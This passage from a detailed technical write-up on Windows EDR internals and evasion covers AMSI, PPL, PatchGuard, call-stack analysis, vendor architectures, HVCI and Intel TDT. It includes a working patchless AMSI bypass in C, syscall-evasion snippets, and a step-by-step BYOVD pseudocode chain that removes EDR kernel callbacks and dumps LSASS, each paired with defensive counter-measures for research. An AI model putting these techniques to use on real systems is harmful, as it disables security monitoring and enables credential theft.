- EDR can register a **permanent callout** (survives driver unload) at max weight `0xFFFFFFFFFFFFFFFF` with `FWP_ACTION_PERMIT` and `FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT` — this callout's permit decision cannot be overridden by user-added block filters
- WFP **sublayer weighting**: the EDR's sublayer weight determines priority; if EDR creates a sublayer with `weight = 0xFFFF`, its filters process first

---

## 9. AMSI: The Scripting Safety Net

The **Antimalware Scan Interface** (implemented in `amsi.dll`) provides a standardized API for script interpreters to submit content for scanning before execution.

### AMSI Integration Points

| Runtime | AMSI Integration |
|---------|-----------------|
| PowerShell 5.1+ | Before script block execution |
| Windows Script Host | Before VBScript/JScript execution |
| JavaScript/JScript | Via `IActiveScriptSite::OnScriptError` override |
| Office VBA | Before macro execution (Office 2016+) |
| WMI | Before WMI script execution |
| .NET | Via `System.Management.Automation` assembly |
| Custom apps | Via `AmsiScanBuffer()` / `AmsiScanString()` API |

### AMSI Flow

```
PowerShell receives script block
         │
         ▼
AmsiInitialize("PowerShell")  → creates AMSI context
         │
         ▼
AmsiOpenSession(context, &session)
         │
         ▼
AmsiScanBuffer(context, session, buffer, size, "filename", &result)
         │    ↑
         │    └── calls all registered AMSI providers
         │         including EDR's AmsiProvider.dll
         ▼
AMSI_RESULT_DETECTED → PowerShell throws exception
AMSI_RESULT_CLEAN    → script executes
```

### Patchless AMSI Bypass via Hardware Breakpoints

The classic `AmsiScanBuffer` byte-patch is detected by memory scanning. The stealthy modern approach uses hardware debug registers:

```c
// Step 1: Set hardware breakpoint (Dr0) on AmsiScanBuffer
CONTEXT ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
GetThreadContext(GetCurrentThread(), &ctx);
ctx.Dr0 = (DWORD64)AmsiScanBuffer;
ctx.Dr7 = 0x1;  // enable Dr0 local breakpoint (execute, 1-byte)
// DON'T use SetThreadContext — it fires EtwTiLogSetContextThread!
// Use NtContinue to set context without ETW-TI detection:
NtContinue(&ctx, FALSE);

// Step 2: Install VEH to handle the breakpoint
LONG CALLBACK AmsiVeh(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
        ep->ExceptionRecord->ExceptionAddress == g_AmsiScanBuffer) {
        // Forge AMSI_RESULT_CLEAN in the output parameter
        AMSI_RESULT *pResult = *(AMSI_RESULT**)(ep->ContextRecord->Rsp + 0x28);
        if (pResult) *pResult = AMSI_RESULT_CLEAN;
        // Return from AmsiScanBuffer as if succeeded
        ep->ContextRecord->Rip = *(DWORD64*)ep->ContextRecord->Rsp; // ret addr
        ep->ContextRecord->Rsp += 8;
        ep->ContextRecord->Rax = S_OK;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
AddVectoredExceptionHandler(1, AmsiVeh);
```

**Why this matters for EDR:** Using `NtContinue` to set hardware breakpoints instead of `SetThreadContext` avoids generating `EtwTiLogSetContextThread` events, making this technique significantly harder to detect from the ETW-TI perspective. Modern EDRs (Elastic, MDE) have added specific detection for this pattern.

---

## 10. AM-PPL, ELAM, and Process Protection

### Early Launch Antimalware (ELAM)

ELAM drivers load at boot time, **before any third-party code**, allowing them to evaluate boot drivers:

```
BIOS/UEFI → Windows Boot Manager → WinLoad.exe → NT Kernel
                                                       │
                                               [ELAM Driver loads]
                                                       │
                                               [Evaluates each boot driver]
                                                       │
                                         KnownGood │ KnownBad │ Unknown
                                                       │
                                        [Other boot drivers load]
```

The ELAM driver provides a **policy database** embedded in a registry binary blob:
```
HKLM\SYSTEM\CurrentControlSet\Control\EarlyLaunch\
    AlternateErrorControl = ELAM_BOOT_DRIVER_CALLBACK_REGISTRY_ENTRY[]
```

Each `ELAM_BOOT_DRIVER_CALLBACK_REGISTRY_ENTRY` contains: `ImageHash`, `HashAlgorithmID`, `ImageThumbprint`, `CertificatePublisher`, `CertificateIssuer`, `Classification`.

**Requirements to become an ELAM vendor**: Apply to Microsoft, legal agreement, implement ELAM driver, pass test suite, receive special **ELAM Authenticode certificate** (distinct from WHQL).

### AM-PPL: Antimalware Protected Process Light

The Protected Process model creates process isolation enforced by the kernel's object manager:

```
Process Protection Levels (ascending strength):
  ┌───────────────────────────────────────────────────────┐
  │ PsProtectedSignerNone-None (unprotected)              │
  │ PsProtectedSignerAntimalware-Light (EDR sensor svc)   │ ← Most EDR services
  │ PsProtectedSignerLsa-Light (LSASS with Credential Guard)│
  │ PsProtectedSignerWindows-Light (Windows system svcs)  │
  │ PsProtectedSignerWinTcb-Light                         │
  │ PsProtectedSignerWindows-Full                         │
  │ PsProtectedSignerWinTcb-Full (most trusted)           │
  └───────────────────────────────────────────────────────┘
```

**Enforcement in kernel** (`ObpGrantAccess`):
- If target process has Protection level X, and calling process has level < X, kernel strips `PROCESS_VM_READ`, `PROCESS_VM_WRITE`, `PROCESS_TERMINATE`, `PROCESS_CREATE_THREAD` from the granted access
- `SeDebugPrivilege` does NOT bypass PPL enforcement
- Even `NT AUTHORITY\SYSTEM` (highest user privilege) cannot dump a PPL process

**EPROCESS Protection field:**
```c
typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type   : 3;  // PS_PROTECTED_TYPE (None=0, Light=1, Full=2)
            UCHAR Audit  : 1;
            UCHAR Signer : 4;  // PS_PROTECTED_SIGNER
        };
    };
} PS_PROTECTION;
// Located at EPROCESS + 0x87A (W11 22H2, varies by build)
```

**Dual benefit of AM-PPL:**
1. Protects the EDR service from termination/injection
2. Grants access to `Microsoft-Windows-Threat-Intelligence` ETW provider (checked in `EtwpCheckNotificationAccess`)

---

## 11. PatchGuard and Kernel Integrity Constraints

**Kernel Patch Protection (KPP)**, introduced in Windows XP x64, computes checksums of critical kernel structures and verifies them at **randomized intervals** (typically every 5–10 minutes, jittered). Mismatch triggers `KeBugCheckEx` with code `0x109` (`CRITICAL_STRUCTURE_CORRUPTION`).

### What PatchGuard Protects

```
Protected by PatchGuard:
  ├── SSDT (KeServiceDescriptorTable / KeServiceDescriptorTableShadow)
  ├── IDT (Interrupt Descriptor Table)
  ├── GDT (Global Descriptor Table)
  ├── MSRs (LSTAR, SYSENTER_EIP, etc.)
  ├── ntoskrnl.exe / hal.dll / ndis.sys code sections
  ├── Object type structures (_OBJECT_TYPE)
  └── Various critical kernel globals

NOT protected by PatchGuard (EDR callback arrays live here):
  ├── PspCreateProcessNotifyRoutine (callback pointers in NONPAGED pool)
  ├── PspCreateThreadNotifyRoutine
  ├── PspLoadImageNotifyRoutine
  ├── CallbackList in _OBJECT_TYPE (separate allocation, not code section)
  └── ETW provider registration structures (also NONPAGED pool)
```

**The fundamental consequence:**  
All x64 EDRs use **documented kernel callback APIs** rather than SSDT hooks. This is not a choice — it is a PatchGuard enforcement. Any SSDT hook on x64 will trigger a BSOD within minutes.

**PatchGuard on x86:** Non-existent. 32-bit Windows has no KPP. SSDT hooking works on x86 (but the ecosystem has moved to x64).

---

## 12. Memory Analysis and VAD Scanning

The **Virtual Address Descriptor (VAD)** tree is a red-black tree maintained per-process in the kernel, tracking all virtual address space commitments. EDRs use it as a ground truth for memory state.

### VAD Region Classification

```
VAD Entry
├── Type: MEM_IMAGE      → mapped from on-disk PE file
│                           Copy-on-write; kernel tracks backing file
├── Type: MEM_MAPPED     → file mapping (data, not PE)
└── Type: MEM_PRIVATE    → anonymous commit (heap, stack, shellcode)
    └── With PAGE_EXECUTE_* → HIGH SUSPICION
```

### Detection Signals from VAD Analysis

| Signal | Detection | Technique Detected |
|--------|-----------|-------------------|
| `MEM_PRIVATE + PAGE_EXECUTE` | Shellcode | Reflective injection, manual mapping |
| `MEM_IMAGE` page differing from disk | Module tampering | Process hollowing, module stomping |
| VAD `MEM_IMAGE` entry missing from `PEB.Ldr` | Hidden module | Reflective DLL, manual mapping |
| `PEB.Ldr` entry missing from VAD | Module unlinking | Rootkit-style DLL hiding |
| `RW→RX` protection transition | Shellcode staging | Classic shellcode prep |
| Section start address ≠ standard PE alignment | Manual mapping | Reflective DLL |

### The Copy-on-Write Integrity Check

When a process loads a DLL from disk, pages are initially shared (Copy-on-Write). If the EDR wants to verify module integrity:

```python
# Pseudocode: EDR memory integrity check
for region in VirtualQueryEx(process, all_regions):
    if region.type == MEM_IMAGE:
        disk_bytes = read_pe_section_from_disk(region.backing_file, region.offset)
        mem_bytes  = ReadProcessMemory(process, region.base, region.size)
        
        if disk_bytes != mem_bytes:
            # Found modification!
            # Could be: hooked code, process hollowing, stomping
            emit_alert("IMAGE_INTEGRITY_VIOLATION", region)
```

### ETW-TI-Triggered Memory Analysis (Elastic's RX-INT Engine)

Rather than periodic scanning, the RX-INT approach described in arxiv 2508.03879 is event-driven:

```
NtAllocateVirtualMemory called
         │
         ├── ETW-TI: THREATINT_ALLOCVM_LOCAL fires
         │
         ▼
EDR checks: Is this allocation in RX (executable) memory?
         │
    YES  │
         ▼
Take VAD snapshot (XXH64 hash of image sections)
         │
         ▼
PsSetCreateThreadNotifyRoutine fires when thread starts in region
         │
         ├── Thread start in MEM_PRIVATE → immediate memory dump + alert
         │
         └── Thread start in MEM_IMAGE → compare current VAD vs. snapshot
                   │
                   Modified? → alert on specific changed page
```

**Performance**: 0.46% CPU overhead, zero false positives reported in Chrome monitoring tests.

---

## 13. Call Stack Analysis and Validation

The call stack is one of the most powerful signals available to an EDR. Every syscall carries context about *who called it and how*.

### How EDR Captures Call Stacks

1. **ETW-TI events** include the thread's user-mode call stack at time of emission
2. **User-mode hooks** can capture `RtlCaptureStackBackTrace()` at hook site
3. **Kernel callbacks** can walk `Thread->TrapFrame` for user-mode return addresses

### What a Legitimate Call Stack Looks Like

```
NtAllocateVirtualMemory      ← syscall target
ntdll!NtAllocateVirtualMemory ← ntdll stub (legitimate)
ntdll!RtlHeapAlloc            ← heap manager
kernel32!HeapAlloc            ← Win32 wrapper
myapp!main+0x4A               ← application code
kernel32!BaseThreadInitThunk  ← standard thread wrapper
ntdll!RtlUserThreadStart      ← TEB thread startup
```

### What a Suspicious Call Stack Looks Like

```
NtAllocateVirtualMemory        ← syscall target
0x0000017F45AB1337             ← ??? (MEM_PRIVATE region)
0x0000017F45AB1290             ← ??? (MEM_PRIVATE region)
kernel32!BaseThreadInitThunk   ← (may be spoofed)
ntdll!RtlUserThreadStart       ← (may be spoofed)
```

**Anomaly**: Return addresses in private memory (`MEM_PRIVATE`) = unbacked shellcode is calling into ntdll. This is the **primary indicator** for direct syscalls and reflective injection.

### Call Stack Spoofing Techniques

**Synthetic Frame Spoofing (VulcanRaven):**
```
Attack thread:
  [shellcode at MEM_PRIVATE]

Fabricated stack:
  → pretend to return to: kernel32!BaseThreadInitThunk+0x14
  → pretend to return to: ntdll!RtlUserThreadStart+0x21
  → [actual return] to shellcode
```

Problem: The EDR can walk the stack using actual **unwind metadata** in PE headers. If `RBP` chains and `RUNTIME_FUNCTION` tables don't agree, the fabricated frame is detected.

**SilentMoonwalk (desynchronized unwind):**
- Uses ROP gadgets to construct a stack where the *unwind chain* follows legitimate frames
- But actual *control flow* diverges from the unwound path
- Works because most EDRs use only the "fast path" unwind (following RBP) not the "precise path" (following RUNTIME_FUNCTION entries)

**Detection counter:** Elastic's implementation validates unwind-info consistency against function prologues — a discrepancy between `RUNTIME_FUNCTION` entries and actual prologue bytes reveals ROP-based spoofing.

### The Kernel Trap Frame: Silicon-Level Root of Trust

When a thread transitions from ring 3 → ring 0 via `syscall`, the CPU saves the **full register state** to a `KTRAP_FRAME` structure on the kernel stack. This includes the *actual* `RIP` (instruction pointer) at the moment of the syscall.

```c
// Kernel can validate: is the user-mode RIP in a legitimate region?
KTRAP_FRAME *trapFrame = Thread->TrapFrame;
ULONG_PTR rip = trapFrame->Rip;

// Check if RIP points into ntdll.dll text section
// If not → direct syscall detected
if (!IsInImageRange(rip, L"ntdll.dll")) {
    EmitDirectSyscallAlert(Thread);
}
```

This is **not spoofable in user mode** because the trap frame is written by CPU hardware before any user code can modify it.

---

## 14. Real-World EDR Implementations

### 14.1 CrowdStrike Falcon

**Kernel Component:** `CSAgent.sys`
- ELAM-enabled boot driver
- KMDF-based architecture
- File system filter driver registration (FSFilter Anti-Virus altitude range)

**Channel Files:** Encrypted behavioral protection submodules updated multiple times daily. The famous July 2024 outage was caused by a malformed channel file (`291`) that triggered an out-of-bounds memory read in CSAgent.sys.

**Kernel APIs Used:**
- Filter Manager (minifilter)
- Registry filter callbacks  
- Process/thread/image notification callbacks
- Image signature verification (`SeGetImageSigFlags`)
- Named pipe filtering
- Kernel Mode File Copy (W11 22H2+)

**ETW:** "Secure ETW" + AMSI integration + ETW-TI (Anniversary Update+)

**HVCI Compatible:** Yes. Certified to run under Hypervisor-Protected Code Integrity.

### 14.2 Microsoft Defender for Endpoint

**Architecture overview:**

```
┌──────────────────────────────────────────────────────────────┐
│ WdFilter.sys (Minifilter, FSFilter Anti-Virus altitude)      │
│   ├── 4 communication ports                                  │
│   ├── Process/Thread/Image callbacks                         │
│   ├── ObRegisterCallbacks (Process + Desktop objects)        │
│   ├── CmRegisterCallbackEx (Registry)                        │
│   └── PoRegisterPowerSettingCallback                         │
│                                                              │
│ WdNisDrv.sys (WFP Callout Driver)                           │
│   ├── ALE_FLOW_ESTABLISHED_V4/V6                            │
│   ├── STREAM_V4/V6                                          │
│   └── DATAGRAM_DATA_V4/V6                                   │
│                                                              │
│ WdBoot.sys (ELAM Driver)                                    │
│   └── Boot driver classification                             │
└──────────────────────────────────────────────────────────────┘
              │ (Bond-serialized, base64, HTTPS)
              ▼
     MDE Cloud Backend (Microsoft 365 Defender portal)
```

**ETW Subscriptions:** ~65 of ~111 identified providers  
**Detection engine features:**
- Token integrity verification
- PEB inconsistency detection
- Doppelgänging/Ghosting/Herpaderping detection via `FILE_OBJECT` flags in process creation callback
- Bond framework for telemetry serialization

### 14.3 SentinelOne

- Kernel access limited to visibility and anti-tamper (no deep kernel hooks)
- Remote APC execution monitoring
- RPC call re-attribution (identifies original caller through system service chains)
- **Cross-platform:** Linux/K8s uses pure user-space monitoring; macOS uses Apple Endpoint Security Framework (kext-free)
- **SKREAM:** Published framework for kernel exploit mitigations

### 14.4 Elastic Security

**Behavioral Detection Rules (v8.11, 35+ rules):**

```
direct_syscall              → RIP at syscall from MEM_PRIVATE
module_stomping             → image backed pages differ from disk
amsi_patch                  → AmsiScanBuffer memory differs from disk
wldp_patch                  → WldpQueryDynamicCodeTrust patch
etw_patch                   → EtwEventWrite memory differs from disk
remote_thread_shellcode     → thread created in MEM_PRIVATE
process_injection_via_apc   → cross-process APC to executable private region
image_rop                   → return address in hooked/patched image
cross_process_vm_read       → unexpected ReadProcessMemory patterns
call_stack_mismatch         → unwind chain / RBP chain disagreement
```

**Behavioral Flags per API Event (22 flags):**
`direct_syscall`, `cross_process`, `shellcode`, `image_hooked`, `image_rop`, `allocation_private`, `allocation_image`, `abnormal_callstack`, `call_stack_unusual_module`, `call_stack_final_frame`, `call_stack_rop_chain`, ... etc.

The Elastic approach is particularly sophisticated: it **fingerprints events** (hashes key attributes) and only emits **unique events** per process session, dramatically reducing telemetry volume without missing novel behavior patterns.

---

## 15. Evasion Techniques and EDR Counter-Measures

This section analyzes the offense-defense dynamic from a research perspective. Understanding evasion is essential for building effective detections.

### 15.1 Direct Syscalls

**The Problem EDRs Create:** By hooking `ntdll!Nt*` stubs, EDRs intercept calls at the user-mode layer. Direct syscalls bypass the hook by calling `syscall` directly.

**Hell's Gate (Original):**
```c
// Read SSN from ntdll stub
DWORD GetSyscallNumber(const char *funcName) {
    BYTE *stub = GetNtdllFunctionAddress(funcName);
    // Pattern: 4C 8B D1 (mov r10,rcx), B8 XX 00 00 00 (mov eax, SSN)
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        stub[3] == 0xB8) {
        return *(DWORD*)(stub + 4);
    }
    return -1; // Hooked — stub starts with JMP, SSN overwritten
}
```

**Halo's Gate (When stub is hooked):**
```c
// SSNs are sequential by export address order
// If stub N is hooked, check stub N±1 and offset
int FindSSNFromNeighbor(BYTE *hookedStub) {
    // Check next function in export table
    BYTE *next = hookedStub + functionSize;
    if (IsNotHooked(next)) {
        return ExtractSSN(next) - 1; // SSN is one less
    }
    BYTE *prev = hookedStub - functionSize;
    if (IsNotHooked(prev)) {
        return ExtractSSN(prev) + 1;
    }
    return -1; // Both neighbors hooked → Tartarus' Gate
}
```

**SysWhispers2 / FreshyCalls (Export-sorted):**
```c
// Sort all Nt* exports by address → lowest address = SSN 0
// SSN is determined by position in sorted list, not stub bytes
// IMMUNE to inline patching because never reads stub bytes
NtFunctions = SortByAddress(GetAllNtExports());
SSN_NtAllocateVirtualMemory = IndexOf(NtFunctions, "NtAllocateVirtualMemory");
```

**Indirect Syscalls (Stack-walk resistant):**
```c
// Find 'syscall; ret' (0F 05 C3) gadget WITHIN ntdll
BYTE *gadget = FindBytesInNtdll("\x0F\x05\xC3");
// Jump to gadget instead of executing inline syscall
// Return address points INTO ntdll → callstack looks legitimate
```

**EDR Counter-Measures for Syscall Detection:**

```
1. Kernel Trap Frame Check (foolproof):
   When ring-3→ring-0 transition occurs, CPU writes actual RIP to TrapFrame
   Kernel driver checks: is TrapFrame.Rip within ntdll.dll range?
   NO → Direct syscall detected (cannot be spoofed)

2. Instrumentation Callback (Nirvana):
   NtSetInformationProcess(handle, 0x28, &callback, size)
   Stored in KPROCESS.InstrumentationCallback (offset 0x3d8)
   Fires on EVERY user-mode return from syscall
   Validates: is the RIP we're returning to within ntdll/win32u?
   
3. ETW-TI Callstack Correlation:
   THREATINT events include full callstack
   Elastic checks: does any frame in callstack resolve to MEM_PRIVATE?
   YES → flag as direct_syscall
```

### 15.2 Sleep Obfuscation

**The Problem:** EDR memory scanners will find shellcode/beacon in memory during sleep periods.

**Solution:** Encrypt memory during sleep, appear as non-executable data.

```
Ekko technique timeline:
T=0: Create timer queue with 3 timers:
     Timer1 (0ms delay): RtlEncryptMemory(beacon_region)
     Timer2 (1ms delay): NtProtectVirtualMemory(PAGE_NOACCESS)
     Timer3 (sleep_ms delay): NtProtectVirtualMemory(PAGE_EXECUTE_READ)
                               RtlDecryptMemory(beacon_region)
                               NtContinue(original_context)
     Then: WaitForSingleObject(event, INFINITE)

T=sleep: Timer3 fires → decrypt + restore → resume execution

During sleep: Memory shows as PAGE_NOACCESS, non-executable, encrypted
EDR scanner: sees non-executable data → no shellcode signature match
```

**Variants:**
| Tool | Mechanism | Detection Difficulty |
|------|-----------|---------------------|
| Ekko | Timer queues + RtlEncrypt | Medium (PROTECTVM patterns) |
| FOLIAGE | APC chain | Medium |
| Cronos | PAGE_NOACCESS toggle | High |
| DreamWalkers | Sleep + callstack spoof + ghost-loading | Very High |

**EDR Counter:** ETW-TI `THREATINT_PROTECTVM_LOCAL` frequency analysis. Legitimate JIT compilers change protections, but the *pattern* of `RW→NoAccess→RX` at fixed intervals is anomalous.

### 15.3 Process Injection Evolution

```
Classic (Detected trivially):
VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
→ Triggers: ObRegisterCallbacks (cross-process handle), 
            PsSetCreateThreadNotifyRoutine, ETW-TI ALLOCVM/WRITEVM/RESUME

APC Injection:
QueueUserAPC → existing thread in alertable wait
→ Avoids: Thread creation callback
→ Triggers: ETW-TI QUEUEUSERAPC_REMOTE (W10 1903+)

Process Hollowing:
CreateProcess(SUSPENDED) → NtUnmapViewOfSection → VirtualAllocEx(RWX) →
WriteProcessMemory → SetThreadContext → ResumeThread
→ Triggers: PEB inconsistency (MEM_PRIVATE where image should be)
           ETW-TI: ALLOCVM_REMOTE + WRITEVM_REMOTE + SETTHREADCONTEXT

Process Doppelgänging (2017):
NtCreateTransaction → NtCreateFile(transacted) → NtWriteFile(malicious) →
NtCreateSection(from transacted file) → NtRollbackTransaction
→ Tricks: No committed file to scan
→ Detected by: MmDoesFileHaveUserWritableReferences(), GetMappedFileNameW() failure

Process Ghosting (2021):
CreateFile(DELETE_ON_CLOSE) → FILE_DISPOSITION_INFO(delete pending) →
NtCreateSection(executable from open handle) → CloseFile (deletion proceeds)
→ Detected by: FILE_OBJECT delete-on-close flag in process creation callback

Module Stomping:
LoadLibrary(legit.dll) → VirtualProtect(RW) → 
memcpy(payload) → VirtualProtect(RX)
→ Triggers: ETW-TI PROTECTVM_LOCAL
→ Detects: in-memory ≠ on-disk comparison
```

---

## 16. BYOVD: The Nuclear Option

**Bring Your Own Vulnerable Driver** is the current gold standard for disabling EDRs. The attacker loads a legitimately-signed driver with a kernel memory corruption vulnerability, uses it to achieve arbitrary read/write in kernel memory, then surgically removes EDR visibility.

### The BYOVD Kill Chain (EDRSandblast Approach)

```
Step 1: Load vulnerable driver
        LoadDriver("RTCore64.sys")  // MSI Afterburner, CVE-2019-16098
        LoadDriver("gdrv.sys")      // Gigabyte, arbitrary R/W
        LoadDriver("DBUtil_2_3.sys") // Dell, arbitrary R/W

Step 2: Resolve kernel base
        EnumDeviceDrivers() → find ntoskrnl.exe base address

Step 3: Compute structure offsets
        Download PDB for current ntoskrnl.exe build
        Extract: PspCreateProcessNotifyRoutine RVA,
                 PspCreateThreadNotifyRoutine RVA,
                 PspLoadImageNotifyRoutine RVA,
                 EtwThreatIntProvRegHandle RVA,
                 EPROCESS.Protection offset,
                 OB_CALLBACK_ENTRY layout

Step 4: Remove process callbacks
        for entry in PspCreateProcessNotifyRoutine[0..63]:
            ptr = ReadKernel8(ntoskrnl + PspCPNR_offset + i*8)
            ptr = ptr & ~0xF  // clear flag bits
            func = ReadKernel8(ptr + EX_CALLBACK_FUNC_OFFSET)
            if func belongs to EDR_driver:
                WriteKernel8(ntoskrnl + PspCPNR_offset + i*8, 0)
                KfDecrement(ptr + RefCount)  // avoid leak

Step 5: Disable object callbacks
        OB_TYPE = *PsProcessType
        CallbackList = OB_TYPE + CALLBACK_LIST_OFFSET
        for entry in CallbackList:
            entry.Enabled = 0  // disable without removing

Step 6: Disable minifilter callbacks
        Frame = FltGlobals.FirstFrame
        while Frame:
            Volume = Frame.FirstVolume
            while Volume:
                for callback_node in Volume.Callbacks.PreCreate:
                    if DriverBelongsToEDR(callback_node.Driver):
                        UnlinkNode(callback_node)

Step 7: Disable ETW-TI
        ProvInfo = EtwThreatIntProvRegHandle + PROV_ENABLE_INFO_OFFSET
        WriteKernel4(ProvInfo, 0x0)  // zero out IsEnabled flags

Step 8 (Optional): Elevate to PPL
        WriteKernel1(EPROCESS.Protection, PsProtectedSignerWinTcb-Light)
        → Own process now dominates LSASS protection level
        → Can call MiniDumpWriteDump on LSASS
```

### BYOVD Industrialization (2024-2025)

The threat landscape shifted from EDRSandblast-style targeted attacks to **industrialized BYOVD tooling**:

- **RansomHub** (2024): Used 2,500+ variants of TrueSight anti-rootkit driver across campaigns
- **Babuk** (2025): Abused legitimate SentinelOne installer package (BYOI — Bring Your Own Installer)
- **Reynolds ransomware** (2025): Embedded NsecSoft driver (CVE-2025-68947)
- **Lazarus (FudModule)**: Selective ETW-GUID disabling per provider — surgical, leaves most telemetry intact

### BYOVD Mitigations (2026 Status)

| Mitigation | Status | Effectiveness |
|-----------|--------|--------------|
| Microsoft Vulnerable Driver Blocklist | Default-on W11 22H2+ | High (but requires updates) |
| HVCI | Opt-in (W11 22H2+ default on modern hardware) | Very High |
| WDAC (Windows Defender Application Control) | Enterprise deployment | High |
| ASR Rule: Block vulnerable driver load | Available via MDE | Medium |
| Kernel-mode code signing enforcement | Default since W10 x64 | Medium (bypassed by BYOVD) |

**HVCI's effect on BYOVD:** With HVCI enabled, even if an attacker achieves arbitrary kernel write via a vulnerable driver, they **cannot write to executable kernel pages** (the hypervisor enforces W^X from VTL 1). This eliminates kernel code injection but does NOT prevent data-only attacks (zeroing callback pointers, modifying EPROCESS fields) — which is exactly what EDRSandblast does.

---

## 17. HVCI and VBS: The New Frontier

**Virtualization-Based Security (VBS)** creates a hardware-isolated environment using the CPU's hypervisor extensions (Intel VT-x / AMD-V):

```
Normal World (VTL 0)             Secure World (VTL 1)
┌─────────────────────┐          ┌──────────────────────┐
│  Normal Kernel      │ ◄──────► │  Secure Kernel (SK)  │
│  (ntoskrnl.exe)     │  VMCALL  │  (securekernel.exe)  │
│                     │          │                       │
│  Drivers, EDR,      │          │  Credential Guard     │
│  Applications       │          │  HVCI enforcement     │
│                     │          │  VSM secrets          │
└─────────────────────┘          └──────────────────────┘
         │                                │
         └────────────── HV ──────────────┘
                   (Hyper-V hypervisor)
                   Hardware Root of Trust
```

### HVCI Effects on EDR

**For EDR vendors:**
- Cannot use dynamically allocated RWX kernel pages (self-modifying driver code)
- Must use `ExAllocatePoolWithTag` for code pages, which HVCI marks non-executable until `MmMarkPhysicalMemoryAsGood` approves them
- Must be WHQL-certified with HVCI-compatible flag

**For BYOVD attackers:**
- Arbitrary kernel write primitive still works (can write to data pages)
- But CANNOT inject executable kernel shellcode (hypervisor blocks page permission change)
- Data-only BYOVD (zeroing callback pointers) still fully works under HVCI
- This is why EDRSandblast's approach remains relevant even on HVCI systems

### Kernel Control Flow Guard (kCFG)

Under HVCI, **Kernel Control Flow Guard** is automatically enabled:
- Every indirect call in kernel mode is validated against the CFG bitmap
- CFG bitmap maintained in VTL 1 (secure kernel) — cannot be modified from VTL 0
- Effect: Injected shellcode cannot redirect kernel execution through function pointers even with arbitrary write — the CFG check will fail

**However:** Callback *arrays* are legitimate function pointer tables. Zeroing them removes the callbacks entirely rather than redirecting them — this is not a control flow hijack and is not blocked by kCFG.

---

## 18. Hardware-Level Detection: Intel TDT

**Intel Threat Detection Technology (TDT)** represents a fundamentally new detection layer: below the operating system, below the hypervisor, at the silicon level.

### Architecture

```
Application Layer
     │
OS/VMM Layer (where traditional EDR lives)
     │
Intel TDT (Hardware PMU Layer)
     │
Silicon (CPU)
```

**Components:**
1. **PMU (Performance Monitoring Unit)**: Hardware counters tracking branch patterns, cache behavior, instruction mix
2. **AET (Advanced Exploit Detection)**: Detects ROP chains, exploit patterns in PMU telemetry
3. **Ransomware Detection**: PMU identifies high-entropy write patterns + rapid encryption behavioral signatures

### Integration with EDR Products

Intel TDT integrates with:
- Microsoft Defender for Endpoint
- CrowdStrike Falcon
- Check Point Harmony Endpoint
- ESET Endpoint Security

**Performance study results:**
- Detected **93% of top ransomware variants** from silicon sensor alone
- Boosted overall EDR efficacy by **24%** above software-only detection
- False positive rate: near-zero (hardware patterns are highly specific)

### Why TDT Matters for the Arms Race

Traditional evasion techniques operate at the software layer and are **completely invisible to PMU-based detection**:
- Direct syscalls still generate the same branch patterns
- Sleep obfuscation doesn't hide the encryption operations
- Process injection doesn't eliminate the shellcode's execution behavior

For ransomware detection specifically, no amount of code obfuscation hides the fundamental behavior: rapidly reading and writing files with high entropy. This is detectable at the PMU level regardless of what the code looks like.

---

## 19. The Detection Arms Race: A Timeline

```
Year | Offensive Innovation              | Defensive Response
─────┼───────────────────────────────────┼──────────────────────────────────
2014 │ Reflective DLL Loading            │ VAD-based MEM_PRIVATE scan
2015 │ Process Hollowing                 │ PEB vs VAD integrity check
2016 │ Hook removal (disk vs memory)     │ ETW-TI provider (Win10 AnnivUpd)
2017 │ Process Doppelgänging             │ MmDoesFileHaveUserWritableReferences
2018 │ Hell's Gate (dynamic SSN)         │ Nirvana instrumentation callbacks
2019 │ Halo's Gate, APC injection        │ ETW-TI QUEUEUSERAPC_REMOTE (1903)
2020 │ Indirect syscalls                 │ Trap frame RIP validation
2020 │ Call stack spoofing               │ ETW-TI callstack analysis
2021 │ Process Ghosting                  │ FILE_OBJECT delete-pending detection
2021 │ BYOVD industrialization           │ Vulnerable driver blocklist
2021 │ Sleep obfuscation (Ekko)          │ PROTECTVM frequency analysis
2022 │ VEH-based syscalls (FreshyCalls)  │ Export-sort detection heuristics
2022 │ ETW session disabling             │ ETW structure integrity monitoring
2022 │ SilentMoonwalk (unwind desync)    │ Precise unwind-vs-prologue validation
2023 │ Patchless AMSI via VEH            │ NtContinue debug register monitoring
2024 │ EDRSilencer WFP abuse             │ WFP audit events 5447+, callouts
2024 │ RansomHub 2500+ driver variants   │ Driver blocklist expansion (24H2)
2025 │ BYOI (installer abuse)            │ Installer integrity validation
2025 │ Lazarus ETW-GUID selective disable│ Per-GUID ETW health monitoring
2026 │ ???                               │ Intel TDT + HVCI mainstream adoption
```

---

## 20. Threat Modeling the EDR Itself

The most sophisticated perspective: treating the EDR as a **target for attack**, not just a defensive tool.

### EDR Attack Surface Map

```
┌─────────────────────────────────────────────────────────────┐
│                    EDR Attack Surface                        │
│                                                              │
│  Kernel Components              User-Mode Components         │
│  ┌──────────────────┐          ┌─────────────────────┐      │
│  │ Kernel Driver    │          │ Sensor Service       │      │
│  │ ├─ IOCTL handler │          │ ├─ RPC/named pipe    │      │
│  │ ├─ IRP handling  │          │ ├─ DLL injection     │      │
│  │ └─ Callback regs │          │ └─ Config storage    │      │
│  └──────────────────┘          └─────────────────────┘      │
│          │                              │                    │
│  ┌───────▼──────────┐          ┌───────▼─────────────┐      │
│  │ Minifilter       │          │ Cloud Transport      │      │
│  │ ├─ Pre-op handler│          │ ├─ TLS to cloud      │      │
│  │ └─ Port handler  │          │ └─ Auth tokens       │      │
│  └──────────────────┘          └─────────────────────┘      │
│                                                              │
│  Attack Vectors:                                             │
│  [A] Kernel driver logic bugs → privilege escalation         │
│  [B] IOCTL attack surface → LPE/BSOD                        │
│  [C] IRP handler parsing bugs → kernel memory corruption     │
│  [D] BYOVD → blind all kernel callbacks                      │
│  [E] WFP manipulation → block cloud telemetry upload         │
│  [F] Process termination (if not AM-PPL) → kill sensor       │
│  [G] DLL unhooking → remove user-mode visibility             │
│  [H] ETW provider disabling → blind ETW-TI                   │
└─────────────────────────────────────────────────────────────┘
```

